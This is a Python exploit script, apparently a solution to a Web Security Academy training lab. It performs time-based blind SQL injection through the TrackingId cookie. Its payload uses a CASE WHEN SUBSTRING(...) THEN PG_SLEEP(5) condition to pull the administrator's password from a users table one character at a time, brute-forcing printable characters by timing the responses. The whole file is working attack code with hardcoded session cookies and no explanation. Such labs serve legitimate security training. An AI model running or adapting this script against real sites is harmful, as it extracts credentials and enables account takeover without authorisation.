#!/bin/python3
import requests
import urllib.parse

import string

BASE_URL = 'https://0abd00260372c21fc073110a00e10022.web-security-academy.net/'

COOKIE_TRACKING_ID = 'Jm3SkiqSvxIY6iXg'
COOKIE_SESSION_ID  = 'Ff1KaQv4HyDxrXIaIb6UnnDdW4D1GOuu'

def main():
    counter = pos = 1
    password = ''
    password_max_length = 30 

    session = requests.Session()
    print("Trying to guess the password", end = ' ', flush=True)

    while counter <= password_max_length:

        keep_running = False
        for char in string.printable:
            print('.', end='', flush=True)

            if char in ['\n', '\r', '\t']:
                continue
            elif char in [';', '+']:
                char = urllib.parse.quote(char)

            payload = f'\'+AND+CASE+WHEN+SUBSTRING((SELECT+password+FROM+users+WHERE+username=\'administrator\'),{pos},1)=\'{char}\'+THEN+PG_SLEEP(5)+END+AND+\'A\'=\'A'

            cookies = {
                'TrackingId': f'{COOKIE_TRACKING_ID}{payload}',
                'session': COOKIE_SESSION_ID
            }

            response = session.get(url=BASE_URL, cookies=cookies)
            
            if response.elapsed.total_seconds() >= 5:
                password += char
                pos += 1

                print(f'[{char}]', end='', flush=True)
                keep_running = True
                break
        
        if not keep_running:
            break

        counter += 1
        
    print(f'\n\nGuessed Password={password}')

if __name__ == "__main__":
    main()
